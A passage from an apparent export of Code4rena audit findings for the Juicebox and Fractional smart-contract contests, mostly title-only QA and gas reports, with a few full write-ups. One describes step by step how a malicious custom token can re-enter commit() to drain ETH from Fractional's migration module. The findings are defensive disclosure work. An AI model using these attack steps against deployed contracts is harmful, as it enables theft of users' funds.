"target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/70", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/62", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/60", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Unhandled chainlink revert would lock all price oracle access", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/59", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor acknowledged", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "Unhandled chainlink revert would lock all price oracle access"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/56", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "JBToken: burn function could burn tokens of any user", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/47", "labels": ["bug", "documentation", "QA (Quality Assurance)", "sponsor acknowledged", "valid"], "target": "2022-07-juicebox-findings", "body": "JBToken: burn function could burn tokens of any user"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/43", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/36", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/21", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/20", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/12", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/11", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "processFees() may fail due to exceed gas limit", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/8", "labels": ["bug", "documentation", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-07-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/abstract/JBPayoutRedemptionPaymentTerminal.sol#L594   # Vulnerability details  ## processFees() may fail due to exceed gas limit  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/abstract/JBPayoutRedemptionPaymentTerminal.sol#L594  ### Impact  the function `processFees()` in `JBPayoutRedemptionPaymentTerminal.sol` may fail due to unbounded loop over `_heldFeesOf[_projectId]`  `_heldFeesOf[_projectId]` can get very large due to the function `_takeFeeFrom()` where it pushes fees that should be paid to a specific beneficiary onto the array  https://github.com/jbx-protocol/juice-contracts-v2-code4rena/blob/828bf2f3e719873daa08081cfa0d0a6deaa5ace5/contracts/abstract/JBPayoutRedemptionPaymentTerminal.sol#L1199  `_heldFeesOf[_projectId]` could get large and cause a DOS condition where no fees can be distributed due to exceed of gas limit  ### Proof of Concept  ```     for (uint256 _i = 0; _i < _heldFeeLength; ) {       // Get the fee amount.       uint256 _amount = _feeAmount(         _heldFees[_i].amount,         _heldFees[_i].fee,         _heldFees[_i].feeDiscount       ); ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/5", "labels": ["bug", "QA (Quality Assurance)", "valid"], "target": "2022-07-juicebox-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/4", "labels": ["bug", "G (Gas Optimization)", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "old-submission-method", "valid"], "target": "2022-07-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Agreement & Disclosures", "html_url": "https://github.com/code-423n4/2022-07-juicebox-findings/issues/1", "labels": [], "target": "2022-07-juicebox-findings", "body": "Agreement & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/650", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/648", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/646", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/645", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/640", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/638", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/637", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Use of Unchecked transfer/transferFrom functions", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/633", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Use of Unchecked transfer/transferFrom functions"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/631", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/628", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/627", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/622", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/621", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/620", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/618", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/617", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/616", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/614", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/613", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Migration total supply reduction can be used to remove minority shareholders", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/612", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L469-L472 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L95-L98   # Vulnerability details  As new total supply can be arbitrary, setting it significantly lower than current (say to 100 when it was 1e9 before) can be used to remove current minority shareholders, whose shares will end up being zero on a precision loss due to low new total supply value. This can go unnoticed as the effect is implementation based.  During Buyout the remaining shareholders are left with ETH funds based valuation and can sell the shares, but the minority shareholders that did contributed to the Migration, that could have other details favourable to them, may not realize that new shares will be calculated with the numerical truncation as a result of the new total supply introduction.  Setting the severity to medium as this is a fund loss impact conditional on a user not understanding the particulars of the implementation.  ## Proof of Concept  Currently migrateFractions() calculates new shares to be transferred for a user as a fraction of her contribution:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L469-L472  ```solidity         // Calculates share amount of fractions for the new vault based on the new total supply         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);         uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /             totalInEth; ```  If Bob the msg.sender is a minority shareholder who contributed to Migration with say some technical enhancements of the Vault, not paying attention to the total supply reduction, his share can be lost on commit():  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L209-L210  ```solidity             // Starts the buyout process             IBuyout(buyout).start{value: proposal.totalEth}(_vault); ```  As commit() starts the Buyout, Bob will not be able to withdraw as both leave() and withdrawContribution() require INACTIVE state:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L149-L150  ```solidity         State required = State.INACTIVE;         if (current != required) revert IBuyout.InvalidState(required, current); ```  If Buyout be successful, Bob's share can be calculated as zero given his small initial share and reduction in the Vault total shares.  For example, if Bob's share together with the ETH funds he provided to Migration were cumulatively less than 1%, and new total supply is 100, he will lose all his contribution on commit() as migrateFractions() will send him nothing.  ## Recommended Mitigation Steps  Consider requiring that the new total supply should be greater than the old one:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L95-L98  ```solidity         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply; +       require(proposal.newFractionSupply > proposal.oldFractionSupply, \"\"); // reference version ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/611", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/610", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/609", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/608", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Receiving address might not be able to handle `WETH` instead of `ETH`", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/607", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Receiving address might not be able to handle `WETH` instead of `ETH`"}, {"title": "ERC20 RETURN VALUES NOT CHECKED", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/599", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "ERC20 RETURN VALUES NOT CHECKED"}, {"title": "It's not possible to withdraw accidentally sent funds from the Vault contract.", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/598", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-fractional-findings", "body": "It's not possible to withdraw accidentally sent funds from the Vault contract."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/596", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/594", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/592", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/590", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/583", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/581", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/578", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Migration Module: Re-enter `commit` using custom token", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/576", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L207-L212   # Vulnerability details  ## Impact  HIGH - Assets can be compromised directly. One can drain eth out from migration module to buyout module using custom made FERC1155 token.  ## Proof of Concept  - [proof of concept: `testCommitReenter_poc`](https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L283-L339) - [custom made FERC1155 for the attack](https://gist.github.com/zzzitron/24c02e069b428f7a95ebc6c931e29b4e#file-2022-07-fractionalv2-poc-modules-t-sol-L6-L63)  The proof of concept shows a scenario where alice is draining migration module using custom made FERC1155 token.  1. setup: other people are using migration module and they deposited some eth. (using alice and bob just to simplify the set up process) 2. alice prepared the custom FERC1155 (let's say `evil_token`) 3. alice create a vault with the `evil_token` 4. alice proposes and joins with 0.5 ether 5. when alice calls `commit`, the `evil_token` will reenter `commit` and send money to buyout module  Note: For a simplicity, the `evil_token` reenters for a fixed number of times. But one can adjust to drain all the eth in the migration module. Note2: For now the eth is in the buyout module, but given the current implementation of `buyout` module, the same actor can drain eth from buyout.  The `commit` function is not written in Checks, Effects, Interactions (CEI) patterns.   ```solidity // modules/Migration.sol::commit // proposal.isCommited and started are set after the out going calls (i.e. start, setApprovalFor) // Mitigation idea: set the values before the out going calls  206         if (currentPrice > proposal.targetPrice) { 207             // Sets token approval to the buyout contract 208             IFERC1155(token).setApprovalFor(address(buyout), id, true); 209             // Starts the buyout process 210             IBuyout(buyout).start{value: proposal.totalEth}(_vault); 211             proposal.isCommited = true; 212             started = true; 213         } ```  ## Tools Used  foundry  ## Recommended Mitigation Steps  Follow Checks, Effects, Interactions patterns. One can also consider adding reentrancy guard.      "}, {"title": "Buyout Module: `redeem`ing before the update of totalSupply will make buyout's current state success", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/574", "labels": ["bug", "2 (Med Risk)", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Buyout Module: `redeem`ing before the update of totalSupply will make buyout's current state success"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/569", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/565", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/561", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "deployFor() in VaultFactory uses tx.origin to create vault, so it's possible to redirect someone transaction to deployFor() and become the owner of their vault", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/558", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-fractional-findings", "body": "deployFor() in VaultFactory uses tx.origin to create vault, so it's possible to redirect someone transaction to deployFor() and become the owner of their vault"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/557", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/556", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/555", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/554", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/553", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/552", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/551", "labels": ["bug", "duplicate", "G (Gas Optimization)"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/548", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "The `FERC1155.sol` don't respect the EIP2981", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/544", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/FERC1155.sol#L31-L34   # Vulnerability details  ## Impact  The [EIP-2981: NFT Royalty Standard](https://eips.ethereum.org/EIPS/eip-2981) implementation is incomplete, missing the implementation of `function supportsInterface(bytes4 interfaceID) external view returns (bool);` from the [EIP-165: Standard Interface Detection](https://eips.ethereum.org/EIPS/eip-165)  ## Proof of Concept  A marketplace implemented royalties could check if the NFT have royalties, but if don't add the interface of `ERC2981` on the `_registerInterface`, the marketplace can't know if this NFT haves  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Like in [solmate ERC1155.sol](https://github.com/Rari-Capital/solmate/blob/03e425421b24c4f75e4a3209b019b367847b7708/src/tokens/ERC1155.sol#L137-L146) add the `ERC2981` interfaceId on the `FERC1155` contract ```solidity     /*//////////////////////////////////////////////////////////////                               ERC165 LOGIC     //////////////////////////////////////////////////////////////*/      function supportsInterface(bytes4 interfaceId) public view  override returns (bool) {         return             super.supportsInterface(interfaceId) ||             interfaceId == 0x2a55205a; // ERC165 Interface ID for ERC2981     } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/542", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/540", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/539", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "sponsor disputed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/538", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/534", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/532", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/526", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/524", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/523", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/522", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/520", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/517", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/514", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/512", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/511", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/510", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/509", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/508", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/507", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/506", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Use of `payable.transfer()` may lock user funds", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/504", "labels": ["bug", "2 (Med Risk)", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Use of `payable.transfer()` may lock user funds"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/500", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/499", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/498", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/497", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/496", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/491", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/488", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Delegate call in `Vault#_execute` can alter Vault's ownership", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/487", "labels": ["bug", "2 (Med Risk)", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Delegate call in `Vault#_execute` can alter Vault's ownership"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/484", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/479", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/478", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/476", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Malicious Users Can Exploit Residual Allowance To Steal Assets", "html_url": 